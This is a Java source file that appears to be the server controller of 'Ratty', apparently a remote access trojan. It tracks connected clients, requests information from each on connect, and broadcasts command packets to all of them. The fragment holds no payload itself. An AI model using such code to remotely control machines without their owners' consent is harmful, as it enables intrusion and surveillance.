package de.sogomn.rat.server;

import java.util.ArrayList;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.IConnectionObserver;
import de.sogomn.rat.packet.IPacket;
import de.sogomn.rat.packet.InformationPacket;

public abstract class AbstractRattyController implements IServerObserver, IConnectionObserver {
	
	private ArrayList<ActiveConnection> connections;
	
	public AbstractRattyController() {
		connections = new ArrayList<ActiveConnection>();
	}
	
	@Override
	public void connected(final ActiveServer server, final ActiveConnection connection) {
		final InformationPacket packet = new InformationPacket();
		
		connection.setObserver(this);
		connection.start();
		connection.addPacket(packet);
		connections.add(connection);
	}
	
	@Override
	public void disconnected(final ActiveConnection connection) {
		connections.remove(connection);
		
		connection.setObserver(null);
		connection.close();
	}
	
	@Override
	public void closed(final ActiveServer server) {
		connections.stream().forEach(connection -> {
			connection.setObserver(null);
			connection.close();
		});
		
		connections.clear();
	}
	
	public void broadcast(final IPacket packet) {
		connections.stream().forEach(connection -> {
			connection.addPacket(packet);
		});
	}
	
}
